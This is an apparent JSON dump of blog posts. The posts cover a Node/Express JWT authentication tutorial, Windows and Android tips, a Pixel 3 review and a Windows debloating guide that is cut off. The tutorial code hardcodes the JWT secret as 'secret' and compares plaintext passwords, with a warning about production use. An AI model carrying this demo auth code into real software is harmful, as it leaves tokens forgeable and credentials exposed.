token&#8217; in the login response, we are going to return a valid JWT.\n\nCreate Token\n\nLet&8217;s create a function called create token. It will create a JWT token that expires 30 seconds in the future and contains the user&#8217;s email as the payload. For this, we are going to use the a href=\"https://github.com/auth0/node-jsonwebtoken\" target=\"_blank\" rel=\"noopener\"jsonwebtoken&nbsp;library/a.\n\nprefunction createToken(){\n    // sign with default (HMAC SHA256)\n    let expirationDate =  Math.floor(Date.now() / 1000) + 30 //30 seconds from now\n    var token = jwt.sign({ userID: user.email, exp: expirationDate }, secret);\n    return token;\n}\n\n/pre\n\nAlso, let&#8217;s define the secret to use. For simplicity, let&#8217;s just call it secret. But please don&#8217;t do that in production:\n\npreconst secret = 'secret';/pre\n\nModify the login response to return the token instead of &#8216;a token&#8217;.\n\npreif (req.body.email == user.email && req.body.password == user.password) {\n            res.send(createToken())\n        }else{\n            res.sendStatus(400);\n        }\n/pre\n\nValidating Token\n\nSo now the user will receive a token when he&nbsp;logins. The next step is for our server to verify the token for the protected route. For this, we are going to use the a href=\"https://github.com/auth0/express-jwt\" target=\"_blank\" rel=\"noopener\"jwt&nbsp;middlware for express/a.\n\nNow let&8217;s modify the home route to process the token. By default, the middleware assumes that the token will be located in a header called&nbsp;Authorization. If you are testing this with postman, make sure that you have a header called Authorization with its value as \\Bearer YourACTUALToken.&nbsp;\\As for the secret, pass it the name of your variable that stores the secret.\n\npreapp.get('/home',jwtVerifier({secret: secret}), (req, res) =&gt; {\n    res.send('Congratulations, you made it to home');\n})\n/pre\n\nNow when the user accesses the home route it will check to see if the token is valid and not expired. If that is the case, the request is processed. Otherwise, we throw him an error. Let&#8217;s define the error below:\n\npreapp.use((err, req, res, next) =&gt; {\n    if (err.name === 'UnauthorizedError') {\n        res.status(500).send(err.message);\n    }\n});\n/pre\n\nThere you go. Test the application and give it a try. If a valid user logs in they will get a JWT that&#8217;s valid for 30 seconds. They can then access the home route along as they have that token in their request header and it&#8217;s not expired or tampered with. Otherwise, we through them an error and they will need to get a new token.\n\na href=\"https://github.com/DaveBben/jwt\" target=\"_blank\" rel=\"noopener\"You can view the full code on GitHub./a\n",
        "tags": [
            "express",
            "jwt",
            "nodejs",
            "security",
            "javascript"
        ]
    },
    {
        "uri": "/how-to-enable-ultimate-performance-mode-in-windows-10/",
        "title": "How to Enable Ultimate Performance Mode in Windows 10",
        "content": "The Windows 10 April update brought a lot of new features. One of the little-known features is a new power plan called ultimate performance mode. According to Microsoft, this mode decreases the micro-latency between the OS and the hardware. Exactly what that means, I&#8217;m not too sure. However, this mode is more than just made up fluff.\n\nI ran a couple of benchmarks between using the default balanced mode on my PC and the ultimate performance mode. In Cinebench, I scored 816 with balanced and 848 with ultimate performance mode. In user bench, my overall score increased in ultimate performance mode. Most notable were the increased in random read and write speeds for my SSD.\n\nHow to Enable Ultimate Performance Mode in Windows 10\n\nTo enable ultimate performance mode. You will need to make sure that you have installed the latest a href=\"https://support.microsoft.com/en-us/help/4028685/windows-10-get-the-update\" target=\"_blank\" rel=\"noopener\"Windows April 2018 update/a. Ultimate performance mode is only available to Windows Workstation, but you can enable it in any edition of Windows. Open a command prompt with admin privileges and type in the following:\n\nprepowercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61/pre\n\nThen when you go into power plans, you should see ultimate performance mode listed.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2018/05/ulitmate-performance-plan.png\n",
        "tags": [
            "april update",
            "power plans",
            "ultimate perfomance"
        ]
    },
    {
        "uri": "/stream-games-to-chromebook/",
        "title": "Stream Games to Chromebook using Moonlight",
        "content": "If you want to play Fortnite or PUBG on a Chromebook, you can do this through streaming. It&#8217;s very easy to stream games to Chromebook using Moonlight. The only requirement is that you need to have an NVidia 600 Series or higher graphics card.\n\nEnable Streaming in GeForce Experience App\n\nThe first thing you need to do is enable streaming in the GeForce Experience app.\n\n Install Moonlight Extension on Chromebook\n\nYou can a href=\"https://github.com/moonlight-stream/moonlight-chrome/releases\" target=\"blank\" rel=\"noopener\"go here/a to download the moonlight extension. Download the CRX file. Then go to _chrome://extensions in Google Chrome and drag and drop the CRX file in the extension window.\n\nStream Games to Chromebook\n\nMake sure that your Chromebook and host computer is on the same WiFi network. When you open Moonlight, you should see your host computer listed. When you connect, it will prompt you to enter a pin. Afterward, you should see all the games that are listed on your host computer.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2018/04/enable-gamestream.png\n",
        "tags": [
            "moonlight",
            "stream"
        ]
    },
    {
        "uri": "/how-to-theme-and-customize-windows-10/",
        "title": "How to theme and customize Windows 10",
        "content": "Windows 10 doesn&#8217;t have many cool options when it comes to theming. Fortunately, there are developers out there who went the extra step to create theme patchers and ither awesome skins. In this tutorial, I want to show you how you can get your Windows 10 desktop looking like the image below.\n\nDark Theme\n\nThe dark theme I used is called a href=\"https://www.cleodesktop.com/2018/05/after-dark-cc-theme-for-windows10-april.html\" target=\"_blank\" rel=\"noopener\"After Dark CC./a Although it&8217;s a paid theme ($2.50), it looks really cool.\n\nStep 1: Create a System Restore Point\n\nThe theme patcher you will run in step 2, modifies core Windows files. This means that it could break Windows now or in a future update.\n\n Step 2: Download UX Theme Patcher\n\nGo and download the a href=\"https://www.cleodesktop.com/2015/11/install-uxthemepatcher-for-windows-10.html\" target=\"_blank\" rel=\"noopener\"UX theme patcher/a. You will see different folders corresponding to different versions of Windows. Run the application located in your appropriate version of Windows.\n\nOnce it completes, reboot your computer. This theme patcher will allow you to apply the custom theme.\n\nStep 3: Download Theme\n\nNow you can download the After Dark CC theme. Navigate to the folder corresponding to your version of Windows.\n\n&nbsp;\n\nYou will have two more folders that have Show Commandbar and Hide Commandbar; you can use either one. Copy all the contents within one of those folders to C:/Windows/Resources/Themes\n\n Step 4: Apply Theme\n\nTo apply the theme, right-click your desktop and go to personalize. Then go to the themes section and apply the theme.\n\na href=\"https://unisira.deviantart.com/art/SEDA-Theme-for-Windows-10-632936467\" target=\"_blank\" rel=\"noopener\"Seda Theme/a\n\nThis is another theme that you can try. It&8217;s free but has not been updated to support the latest big Windows update (1803). Use at your own risk. To install, perform the same steps as above.\n\n{{ ad }}\n\nCustom Icon Pack\n\nFor the custom folder icons, I used an a href=\"https://unisira.deviantart.com/art/WinRemix-iPACK-for-windows-7-8-8-1-and-10-601279163\" target=\"_blank\" rel=\"noopener\"icon pack from the Seda theme/a. To install, you can download it here.  Remember, create a system restore point!\n\nRename the file with an. EXE extension then run it like any normal application.\n\n Widgets\n\nTo get Widgets on my desktop I used an app called a href=\"https://www.rainmeter.net/\" target=\"_blank\" rel=\"noopener\"Rainmeter/a.  With Rainmeter, it provides you access to hundreds of community created skins. Unlike the theme patching done above, this does not modify system files, so you don&#8217;t need to create a system restore point.\n\nSide Launcher\n\nThat is also a rainmeter skin you can get a href=\"https://devilrev.deviantart.com/art/unFold-A-Launcher-618503449\" target=\"_blank\" rel=\"noopener\"here/a.\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2018/06/customize-windows-10.png\n [2]: http://localhost/wordpress/wp-content/uploads/2018/06/after-dark-cc.png\n [3]: http://localhost/wordpress/wp-content/uploads/2018/06/uxthemepatcher.png\n [4]: http://localhost/wordpress/wp-content/uploads/2018/06/Themes.png\n [5]: http://localhost/wordpress/wp-content/uploads/2018/06/available-themes.png\n [6]: http://localhost/wordpress/wp-content/uploads/2018/06/sedathemeforwindows10byunisira-dagu0wj.jpg\n [7]: http://localhost/wordpress/wp-content/uploads/2018/06/rename-application.png\n [8]: http://localhost/wordpress/wp-content/uploads/2018/06/widgets.png\n [9]: http://localhost/wordpress/wp-content/uploads/2018/06/custom-launcher.png\n",
        "tags": []
    },
    {
        "uri": "/how-to-block-all-ads-on-android-without-root-2/",
        "title": "How to Block All Ads on Android without ROOT",
        "content": "I don&#8217;t think that I have ever encountered anyone who said that they like ads (other than maybe the Super Bowl ads). Nonetheless, ads are a necessary evil which must be tolerated in order to compensate for various internet endeavors. However, there are many apps, games, and websites which abuse ads and destroy the entire experience. In the past, blocking ads from these apps required that you root your device. Luckily, times have changed and there are new solutions to blocking ads on your Android device.\n\nOnly Block Ads Through Web Browser\n\nIf you are only interested in blocking ads that appear when you browse websites on your phone then all you need is a web browser that supports an ad blocker. There are many browsers out there with this capability including a href=\"https://play.google.com/store/apps/details?id=com.sec.android.app.sbrowser\" target=\"blank\" rel=\"noopener\"Samsung Internet/a, a href=\"https://play.google.com/store/apps/details?id=org.mozilla.firefox\" target=\"blank\" rel=\"noopener\"Firefox/a and more. Right now, a href=\"https://play.google.com/store/apps/details?id=com.brave.browser\" target=\"_blank\" rel=\"noopener\"Brave/a is the popular web browser of choice for blocking ads.\n\n{{ ad }}\n\n Block All Ads on Android\n\nIf you want to take it a step further and block all ads on your Android device (including ads in your apps and games) than you can use a VPN solution. With VPM ad blockers they will listen for your DNS queries and block traffic to ad networks. The app I am going to recommend to you is called Blokada. a href=\"https://blokada.org/index.html\" target=\"_blank\" rel=\"noopener\"Blokada/a is open source which is very important in this case. I would be hesitant to use a closed source app for this because I would have no clue on whether the app is exploiting my data.\n\na href=\"https://blokada.org/index.html\" target=\"_blank\" rel=\"noopener\"Download Blokada/a\n\nBlokada is really easy to use. Just install it and activate the blocker. The ads within games and apps will no longer appear (except for an odd few like Instagram). I haven&8217;t tested it long enough to notice any ill effects on battery, but others have said that the difference was negligible.\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2018/06/Screenshot_20180626-195215.jpg\n",
        "tags": [
            "ads",
            "android",
            "vpn"
        ]
    },
    {
        "uri": "/how-to-block-all-ads-on-android-without-root/",
        "title": "How to Block All Ads on Android without ROOT",
        "content": "I don&#8217;t think that I have ever encountered anyone who said that they like ads (other than maybe the Super Bowl ads). Nonetheless, ads are a necessary evil which must be tolerated in order to compensate for various internet endeavors. However, there are many apps, games, and websites which abuse ads and destroy the entire experience. In the past, blocking ads from these apps required that you root your device. Luckily, times have changed and there are new solutions to blocking ads on your Android device.\n\nOnly Block Ads Through Web Browser\n\nIf you are only interested in blocking ads that appear when you browse websites on your phone then all you need is a web browser that supports an ad blocker. There are many browsers out there with this capability including a href=\"https://play.google.com/store/apps/details?id=com.sec.android.app.sbrowser\" target=\"blank\" rel=\"noopener\"Samsung Internet/a, a href=\"https://play.google.com/store/apps/details?id=org.mozilla.firefox\" target=\"blank\" rel=\"noopener\"Firefox/a and more. Right now, a href=\"https://play.google.com/store/apps/details?id=com.brave.browser\" target=\"_blank\" rel=\"noopener\"Brave/a is the popular web browser of choice for blocking ads.\n\n{{ ad }}\n\n Block All Ads on Android\n\nIf you want to take it a step further and block all ads on your Android device (including ads in your apps and games) than you can use a VPN solution. With VPM ad blockers they will listen for your DNS queries and block traffic to ad networks. The app I am going to recommend to you is called Blokada. a href=\"https://blokada.org/index.html\" target=\"_blank\" rel=\"noopener\"Blokada/a is open source which is very important in this case. I would be hesitant to use a closed source app for this because I would have no clue on whether the app is exploiting my data.\n\na href=\"https://blokada.org/index.html\" target=\"_blank\" rel=\"noopener\"Download Blokada/a\n\nBlokada is really easy to use. Just install it and activate the blocker. The ads within games and apps will no longer appear (except for an odd few like Instagram). I haven&8217;t tested it long enough to notice any ill effects on battery, but others have said that the difference was negligible.\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2018/06/Screenshot_20180626-195215.jpg\n",
        "tags": [
            "ads",
            "android",
            "vpn"
        ]
    },
    {
        "uri": "/my-computer-science-degree-was-not-worth-the-cost/",
        "title": "My Computer Science Degree Was Not Worth the Cost",
        "content": "\r\nI am a 2018 college graduate with a bachelor&#8217;s degree in computer science. I recently got hired for my first full-time software developer job. As any new graduate, I was eager to go to work and put this shiny new degree to good use. After just a few weeks on the job, I had a horrible realization. Four years of undergrad and \\$80K taught me nothing of value for today&#8217;s job market.\r\n\r\nspan style=\"text-decoration: underline;\"What I did NOT learn during my undergraduate:/span\r\n\r\nGit/SVN\r\nVersion Control\r\nAgile\r\nScrum\r\nDifferent Developer Roles\r\nWeb Development\r\nDevOps\r\nHTTP Protocols\r\nUnit Testing\r\nContinous Integration/Deployment\r\nCloud Services/AWS\r\nHow to code in a team\r\nNo SQL Database\r\nUX\r\n\r\nI understand that a school can not teach you everything. However, many of these skills are very applicable to today&8217;s job market. Knowing this stuff will give you a better chance of getting hired. Luckily, I was able to learn all of this from my colleagues and the internet.\r\n\r\nspan style=\"text-decoration: underline;\"strongWhat I did learn during my undergraduate/strong/span\r\n\r\nJava\r\nData Structures/Algorithms\r\nAssembly\r\nArchectiecture (storing and retrieving stuff from memory)\r\nOperating Systems & Programming Languages (how they work, how to build one)\r\nBasic Python\r\nOpenGL\r\nRSA\r\n\r\nHere&8217;s a video if you want the more dramatic version. A lot of the comments seem to suggest that this must be an American school thing because they learn most of this in Europe.\r\n\r\n{{ youtube UuqL71drMVU }}\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n",
        "tags": [
            "computer science",
            "degree"
        ]
    },
    {
        "uri": "/best-windows-10-screensavers-2018/",
        "title": "Best windows 10 Screensavers 2018",
        "content": "Here is a collection of some of the best Windows 10 screensavers that you should try.\n\na href=\"https://fliqlo.com/about\" target=\"_blank\" rel=\"noopener\"Fliqlo/a\n\nFliqlo is my favorite Windows 10 screensaver of 2018. It has such a clean and minimalistic look that goes great with the design of my room.\n\na href=\"https://www.geforce.com/games-applications/pc-applications/sun-village\" target=\"_blank\" rel=\"noopener\"Sun Village/a\n\nThis is a screensaver from Nvidia. It&8217;s a nicely rendered 3D scene with lots of activity happening. It looks bright and vibrant and you can even enable the built-in FPS counter. Though, I&#8217;m not sure if I want a screensaver that stresses my GPU especially if I am not going to be activity at my desktop.\n\na href=\"https://github.com/cDima/Aerial\" target=\"_blank\" rel=\"noopener\"Aerial/a\n\nAerial is a beautiful Windows 10 screensaver that displays aerial footage of mountain tops and nature. It&8217;s a port of the Apple TV equivalent screensaver just for Windows.\n\na href=\"http://blog.pixelbreaker.com/polarclock\" target=\"_blank\" rel=\"noopener\"PolarClock/a\n\nPolarClock is another basic screensaver that offers a minimalistic design. It&8217;s essentially a clock that combines, seconds, minutes, hours, days, weeks and years.\n\na href=\"https://github.com/mancoast/BSOD-ScreenSaver/releases\" target=\"_blank\" rel=\"noopener\"BSOD/a\n\nYes, this screensaver displays a fake BSOD. I definitely wouldn&8217;t use this because I would get a mini heart attack every time I look at my monitor.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2018/09/Fliqlo.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2018/09/Sun-Village-1.jpg\n [3]: http://localhost/wordpress/wp-content/uploads/2018/09/Aerial.jpg\n [4]: http://localhost/wordpress/wp-content/uploads/2018/09/Polar.jpg\n [5]: http://localhost/wordpress/wp-content/uploads/2018/09/BSOD.jpg\n",
        "tags": [
            "screensavers"
        ]
    },
    {
        "uri": "/how-to-control-android-from-android/",
        "title": "How to Control Android from Android",
        "content": "There is an easy way that you can control one Android device from another Android device. This is useful if you need to perform any type of tech support for someone else&#8217;s device. To control Android from Android we can use the free app a href=\"https://play.google.com/store/apps/details?id=com.teamviewer.quicksupport.market\" target=\"_blank\" rel=\"noopener\"TeamViewer Quick Support/a.\n\nCompatibility:\n\nThis is not compatible with every Android device. TeamViewer has a a href=\"https://community.teamviewer.com/t5/Knowledge-Base/Supported-manufacturers-for-remotely-controlling-Android-devices/ta-p/4730\" target=\"blank\" rel=\"noopener\"full list of the supported manufacturers/a. Unfortunately, if you have a **Google Pixel** device then you will not be able to take advantage of the remote control capabilities; you will only be able to share your screen. If you have a recent Samsung device like the **Galaxy Note 9**, then you will need to download a href=\"https://community.teamviewer.com/t5/TeamViewer-General/Remote-Control-on-Samsung-Note-9/td-p/42266\" target=\"blank\" rel=\"noopener\"a special test version/a of TeamViewer that doesn&8217;t rely on Knox.\n\nStep One:\n\nFirst, download the a href=\"https://play.google.com/store/apps/details?id=com.teamviewer.quicksupport.market\" target=\"_blank\" rel=\"noopener\"TeamViewer Quick support/a app on the Android device that you want to be controlled. It will generate a pin for you.\n\nimg class=\"alignnone size-large wp-image-4422\" src=\"/wp-content/uploads/2018/09/pin-1024x576.jpg\" alt=\"\" width=\"640\" height=\"360\" srcset=\"http://localhost/wordpress/wp-content/uploads/2018/09/pin-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2018/09/pin-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2018/09/pin-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2018/09/pin.jpg 1280w\" sizes=\"(max-width: 640px) 100vw, 640px\" /\n\n Step Two:\n\nOn the device that you want to do the controlling, download the a href=\"https://play.google.com/store/apps/details?id=com.teamviewer.teamviewer.market.mobile\" target=\"_blank\" rel=\"noopener\"TeamViewer for Remote Control app/a. Open up the app and enter the Pin. On the other device, it will ask the user to confirm the incoming connection.\n\nOnce they confirm, you will now be able to control the Android device.\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2018/09/pin.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2018/09/Allow-remote.jpg\n\n",
        "tags": [
            "control android",
            "remote",
            "teamviewer"
        ]
    },
    {
        "uri": "/how-to-share-wifi-connection-on-android/",
        "title": "How to Share WiFi Connection on Android",
        "content": "Last summer, I was staying at a beautiful resort in the Dominican Republic with no access to mobile data, so I needed to depend on WiFi. Unfortunately, my network access only allowed me to have one device at a time on the network. This was a huge pain because I wanted to connect both my phone and laptop to the network. After some searching, I found out a simple way to share wifi from an android device.\n\nWhat You Will Need:\n\n  a href=\"https://play.google.com/store/apps/details?id=kha.prog.mikrotik\" target=\"_blank\" rel=\"noopener\"Netshare/a\n\n Share Wifi From Android\n\nIn order to share wifi from an Android device, you will need to download an app called a href=\"https://play.google.com/store/apps/details?id=kha.prog.mikrotik\" target=\"_blank\" rel=\"noopener\"strongNetshare/strong/a. This app allows you to share your android wifi connection to other devices without needing a rooted device.\n\n&nbsp;\n\nOnce you open the app, click the button to start the hotspot. You will be provided with a network name (SSID) and password. Unfortunately, you can&#8217;t change them.\n\n&nbsp;\n\nNow on any other device, connect to the listed network name. It might take up to two minutes for it to appear. After you connect, go to the proxy settings and set a proxy with the address and port listed from the app.  Here are the settings on my iPad.\n\n&nbsp;\n\nYou can also find the proxy settings in Windows\n\nThat&#8217;s it. Once you enter the proxy settings you should have an internet connection.\n\n&nbsp;\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2018/10/netshare-google-play.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2018/10/netshare-app.jpg\n [3]: http://localhost/wordpress/wp-content/uploads/2018/10/20181019_171150.jpg\n [4]: http://localhost/wordpress/wp-content/uploads/2018/10/windows-proxy.png\n",
        "tags": [
            "hotspot",
            "share wifi",
            "tether"
        ]
    },
    {
        "uri": "/pixel-3-review-dont-romanticize-imperfection/",
        "title": "Pixel 3 Review – Don’t Romanticize Imperfection",
        "content": "\nLet&#8217;s not romanticize imperfection. The Pixel 3 is not _The Little Engine That Could, _or some gifted boy who was born without legs. There are people out there who treat Google like the underdog; despite the fact that they have full control over the future of Android. And while there&#8217;s nothing wrong with having favorites in a race, it can be dangerous to idolize a runner just based off his shoes. It&#8217;s true that Google does have some nice shoes. Shoes that are stitched with machine learning, powerful heuristics, and pure Android. To an ignorant observer, Google shoes probably appear no better than any other runner. To the adulator or fanboy, these shoes make Google the best runner in the race, despite the fact that they always finish last.\n\nRemember that the Pixel 3 is just another smartphone. Yes, it was &#8220;Made By Google&#8221; but don&#8217;t let that phrase steal your attention. At the end of the day, this is still an expensive \\$800 phone and needs to be treated as such.\n\nBody and Build Quality\n\nWhen I first took the Pixel 3 out of the box, I dropped it 😭. Luckily the fall was only a couple of inches. After my heart resumed its normal rhythm, I took to examining the phone in its bare form. I got the smaller Pixel 3 with the 5.5-inch display. It was a little tough adjusting to such a small phone after spending a year with the 6.3 inch Galaxy Note 8. Although it felt like I was holding a toy, the device does have a satisfying amount of weight. Nonetheless, my small hands appreciate the Pixel 3&8217;s compact size.\n\n{{ ad }}\n\nThe back of the phone is all glass with a matte &#8220;soft touch&#8221; coating on the bottom. I absolutely love it! I get an unnerving sense of satisfaction running my fingers along the back of the device. There&#8217;s also a subtle G logo as the bottom to tell everyone that it&#8217;s a Google phone. Unlike other company&#8217;s logos in the past, I enjoy how subtle the branding is.\n\nWait, doesn&8217;t the back of the Pixel 3 scratch easily?\n\nThere have been early reports of people scratching the back of their Pixel 3 quite easily. Some people did nothing more than take the phone out of their pocket just to find the matte coating laced with a couple of scratches. Oddly enough, I have not had this issue. I even dropped my phone twice (another time at the gym) and still have a clean looking back. Maybe I am just lucky?\n\nThe Pixel 3 puts all of its buttons on one side of the phone. On the right side of the device, you can find the power and volume rocker buttons. It&#8217;s a personal preference but I don&#8217;t like it when phone manufacturers do this. When I&#8217;m in a rush and fumbling for my phone, I always end up hitting the power button instead of the volume up or vice versa. Also, the power button is very hard to click. Some people might not mind this, but it becomes annoying when you try to rapidly tap it to open up the camera app. It just feels forced.\n\nOn the bottom of the device, there&#8217;s a USB 3.1 Type C (with Power Delivery) port.\n\nOh, there&8217;s also no fu\\*cking headphone jack 😡\n\nThe front of the device has two front-facing speakers that sound amazing to my untrained ear. More on that in a bit. Unfortunately, this device does not have an LED notification.\n\nBattery Life\n\nUsually reviewers save battery life for the end of the review for some unknown reason. Like c&8217;mon, most people are only interested in knowing about how often they will have to charge. The battery life on the Pixel 3 is&#8230;okay. It&#8217;s hard to make an accurate judgment because everyone&#8217;s usage is different. Also, I am slightly spoiled by spending time with the Galaxy Note 9 (4000 mAh) and the Oneplus 6 (3300 mAh). The battery on the Pixel 3 is only (2915 mAh). Yes, this is small for an Android device. I have no idea what Google was thinking. Perhaps this was the largest that they could fit in?\n\nOn my first full day of usage, I hit about 4 hours of screen on time before I was down to 10%. That day included 2 hours of Google Maps, 1 hour of streaming music via Bluetooth, and taking some videos for Instagram and Snapchat along with messaging on WhatsApp. I was on battery for around 10 hours that day (unfortunately I forgot to take a screenshot). The following days was more or less the same. Here are my states as I am writing this review right now:\n\n{{ ad }}\n\nBasically, you aren&#8217;t going to pull more than 4 hours of screen on time with the device. The Pixel 3 does have really good standby time though. Leaving your phone idle will drain no more than 1% per hour. Again, I am coming from a phone with a much larger battery so my opinion is going to be skewed. The point being, if you are someone who casually touches your phone and can let it rest periodically, then you will probably be fine with the battery performance.\n\nPerformance\n\nThe Pixel 3 using the Snapdragon 845 processor with the Adreno 630 GPU. This is the CPU all flagship phones are using in 2018. Gaming will be just as good as any other Android device released in 2018. However, the Pixel 3 only has 4GB of RAM. So here&8217;s the deal, 4GB is not inherently bad. This is Android and not Windows. However, many people who buy the Pixel anticipate to keep it for a couple of years, so ideally it should not be severely outdated by next year. This year, we have already witnessed quite a few devices hitting the market with more than 4GB of RAM. The Oneplus 6 with 6GB ($529) and 8GB ($579) of RAM. Along with the Galaxy Note 9 with 6GB ($999) and 8GB ($1249) of RAM and the Razer Phone (\\$799) with 8GB of RAM.\n\nThe Pixel 3 is expensive; It starts at $799. At this price point, you would expect it to keep up with the competitors and offer similar value. Nope. Google turns a blind eye and decides to keep its meager 4GB of RAM unchanged from last year&#8217;s Pixel device. The only real problem that I have encountered so far was that apps don&#8217;t stay in memory as long as they do on my other device. For example, on the Oneplus 6, I could have open up an app that I left alone two days ago and it would resume in the exact state I left it in. On the Pixel 3, after more than 4 or 5 apps things start to reload. The webpage I was on in Chrome would have to re-open. Sync for Reddit would have to reload the comments in a thread. Yes, this is probably the ultimate first world issue but still something not acceptable for a $799 device when the competition does it much better.\n\nMemory management issues too\n\nTo add icing to the cake, there seem to be some aggressive memory management issues going on here too. Many users report having apps close on them unexpectedly. For example, one user complained that if he&8217;s streaming music in his car and using Google Maps then his music app would completely close down if he gets a notification. I have not personally experienced this issue, but there are lots of users who can attest to the previous statement.\n\n{{ ad }}\n\nDisplay\n\nThe Pixel 3 has a 5.5 inch OLED display made by LG with a resolution of 2160 x 1080P. I really can&8217;t find any fault with the display, despite there being a couple of issues posted online. The colors are vibrant and saturant. It gets bright enough to use outdoors, and dark enough to use before bed.\n\nSpeakers\n\nThe Pixel 3 has two front-facing stereo speakers; they are great! Music and videos sound rich and &8220;full&#8221; on the Pixel. It doesn&#8217;t have a dainty, weak speaker like a lot of other smartphones I used in the past. I must warn you though, at maximum volume, there is notable distortion and the device seems to vibrate. It reminds me of a car with its music blasting so loud that you can feel the vibration from down the street. Obviously, not to that extreme but it does vibrate noticeably.\n\nSoftware\n\nThe Pixel 3 is running the latest version of Android (Android 9.0 also known as &8220;Pie&#8221;). The reason that many people choose to buy a Pixel device is for stock android with no bloatware and quick updates straight from Google. What I like most about the Pixel&#8217;s software is its simplicity. Ironically, it&#8217;s also what I hate most about it. Google took a cue from Apple and eliminated most of the &#8220;advanced settings&#8221; and customizations behind hidden menus.\n\nOnly Gesture navigation?\n\nThe Pixel 3 features Android&8217;s new gesture navigation. It&#8217;s a rushed project that Google threw in after seeing the iPhone X. And yes, it&#8217;s definitely not as polished as the animations found on the iPhone X. I actually don&#8217;t mind the gesture navigation that much. It looks cool and isn&#8217;t that hard to use. Although it does get annoying with the awkward double swipe from the home to open up your app drawer. And really, Google should have made this an option and not something you \\_HAVE _to use.\n\nCamera\n\nIt&8217;s so damn good. That&#8217;s really all I can say about this camera. For someone who just posts photos to social media, I have absolutely no complaints about this camera. On top of that, portrait mode is absolutely amazing! In addition, Google is adding neat little camera tricks like a href=\"https://www.theverge.com/18021944/google-night-sight-pixel-3-camera-samples\" target=\"_blank\" rel=\"noopener\"Night sight/a that will brighten up your photos when there&#8217;s not enough light.\n\n&nbsp;\n\nIs the Pixel 3 Worth the cost? Should I buy the Pixel 3?\n\nNo. That&8217;s right, my answer is no. At its current retail price of \\$800 (for the base model), there is nothing that truly justifies its price tag. It&#8217;s a good phone, just not a GREAT phone. It does a lot of things well but falls short in too many areas. There is a whole list of running issues with this device. Some of which include:\n\nMemory Management Issues\n\nSome photos aren&#8217;t being saved\n\nPoor audio quality recording\n\nSpeaker Imbalance\n\nSpeaker distortion\n\nNo 4K Video Recording at 60 FPS\n\nSoftware Glitches\n\nAnd many more you can a href=\"https://www.xda-developers.com/google-pixel-3-pixel-3-xl-issues-problems-help-list/\" target=\"_blank\" rel=\"noopener\"read about here/a.\n\nIf this phone was $150 cheaper, then it would be easier to justify. These defects, but at $800 Google is competing with the big boys here. It&#8217;s also unfortunate that so many Pixel fanboys are giving Google a pass on this and not recognizing a problem when they see it. Yes, most of this should get fixed eventually, but until then you are going to be stuck with a device that might not perform the way you expect it.\n\nWith all that said, I am still holding on to my Pixel 3 for a little longer to see if updates would make it any better.\n\n&nbsp;\n\n[1]: http://localhost/wordpress/wp-content/uploads/2018/10/20181026_123447.jpg\n[2]: http://localhost/wordpress/wp-content/uploads/2018/10/Screenshot_20181023-172841.png\n[3]: http://localhost/wordpress/wp-content/uploads/2018/10/Screenshot_20181025-160843.png\n[4]: http://localhost/wordpress/wp-content/uploads/2018/10/pixel-3-camera-shot-1.jpg\n[5]: http://localhost/wordpress/wp-content/uploads/2018/10/pixel-3-camera-shot-2.jpg\n[6]: http://localhost/wordpress/wp-content/uploads/2018/10/pixel-3-camera-shot-3.jpg\n",
        "tags": [
            "pixel 3",
            "review",
            "smartphone"
        ]
    },
    {
        "uri": "/how-to-remove-bloatware-from-windows-10/",
        "title": "How to Remove Bloatware from Windows 10",
        "content": "Believe it or not, Windows 10 comes with a lot of bloatware pre-installed on it. Things like Candy crash, Bing Weather, Bing Sports, etc. If you really wanted to, you could go through the programs and features tool and remove each app individually. However, that would take a lot of unnecessary time and some apps wouldn&#8217;t show up in that menu. To overcome this challenge, a user on GitHub created a Windows 10 bloatware removal script that uses PowerShell to remove the unnecessary apps. So here&#8217;s how to remove bloatware from Windows 10 using this script.\n\n1. Download the Windows 10 Bloatware Removal Script\n\nNavigate to this a href=\"https://github.com/Sycnex/Windows10Debloater\" target=\"_blank\" rel=\"noopener\"GitHub repo here/a. Then click the option to download the repository as a zip folder. Once it&8217;s downloaded, unzip the folder to any directory.\n\n2. Open Powershell as Administrator\n\nNow you need to open PowerShell as administrator. To do this, search for PowerShell in the start menu and right click on it and choose the option to open up as Administrator.\n\n 3. Run Debloater File\n\n{{ ad }}\n\nNavigate to the folder that you unzipped. To do this, copy the file path from Windows and precede it with the cd command. It should look something like this:\n\ncd C:\\Users\\David\\Downloads\\Windows10Debloater-master\\Windows10Debloater-master\n\nOnce you are in that directory, type in .\\Windows10SysPrepDebloater.ps1, alternatively, you could hit the &#8220;w&#8221; key and &#8220;tab&#8221; and the rest would be filled in for you. You also need to add the following 2 parameters to the command to prep the system and debloat it. The full command should look like this:\n\n.\\Windows10SysPrepDebloater.ps1 -SysPrep -Debloat\n\nHit enter to start the process. This bloatware removal script will remove the following:\n\n3DBuilder, Appconnector, Bing Finance, Bing News, Bing Sports, Bing Weather, Fresh Paint, Get started, Microsoft Office Hub, Microsoft Solitaire Collection, Microsoft Sticky Notes, OneNote, OneConnect, People, Skype for Desktop, Alarms, Camera, Maps, Phone, SoundRecorder, XboxApp, Zune Music, Zune Video, Windows communications apps, Minecraft, PowerBI, Network Speed Test, Phone, Messaging, Office Sway, OneConnect, Windows Feedback Hub, Bing Food And Drink, Bing Travel, Bing Health And Fitness, Windows Reading List, Twitter, Pandora, Flipboard, Shazam, CandyCrush, CandyCrushSoda, King apps, iHeartRadio, Netflix, DrawboardPDF, PicsArt-PhotoStudio, FarmVille 2 Country Escape, TuneInRadio, Asphalt8, NYT Crossword, CyberLink MediaSuite Essentials, Facebook, Royal Revolt 2, Caesars Slots Free Casino, March of 